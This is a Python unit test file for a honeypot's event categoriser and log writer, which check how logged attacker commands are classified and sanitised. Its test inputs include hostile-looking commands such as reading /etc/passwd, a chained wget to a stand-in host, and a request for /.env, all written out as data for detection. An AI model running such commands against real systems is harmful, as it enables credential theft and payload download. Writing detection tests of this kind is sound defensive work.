import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from honeypot.eventlog import EventLog  # noqa: E402
from honeypot.events import infer_category, new_event  # noqa: E402


class EventTests(unittest.TestCase):
    def test_categories(self):
        self.assertEqual(infer_category("connection", None, None), "connection")
        self.assertEqual(infer_category("auth_attempt", None, "/login"), "authentication")
        self.assertEqual(infer_category("command", "uname -a", "/root"), "recon")
        self.assertEqual(infer_category("command", "cat /etc/passwd", None), "collection")
        self.assertEqual(
            infer_category("command", "cat /etc/passwd; wget http://example.invalid/x", None),
            "egress_attempt",
        )
        self.assertEqual(infer_category("http_request", "GET", "/.env"), "collection")
        self.assertEqual(infer_category("ftp_command", "RETR README.txt", "README.txt"), "collection")

    def test_control_characters_stay_on_one_line(self):
        import tempfile

        with tempfile.TemporaryDirectory() as tmp:
            log = EventLog(Path(tmp), echo=False)
            log.write(new_event(
                session_id="abc",
                service="ssh",
                event_type="command",
                src_ip="127.0.0.1",
                src_port=1,
                dst_port=2222,
                summary="a\nb\r\x1b[31m",
                command="wget http://example.invalid/lab-decoy.sh",
            ))
            lines = log.json_path.read_text(encoding="utf-8").splitlines()
            self.assertEqual(len(lines), 1)
            self.assertNotIn("\x1b", lines[0])
            event = __import__("json").loads(lines[0])
            self.assertEqual(event["category"], "egress_attempt")
            self.assertEqual(event["indicator"], "http://example.invalid/lab-decoy.sh")
            self.assertNotIn("\n", event["summary"])


if __name__ == "__main__":
    unittest.main()
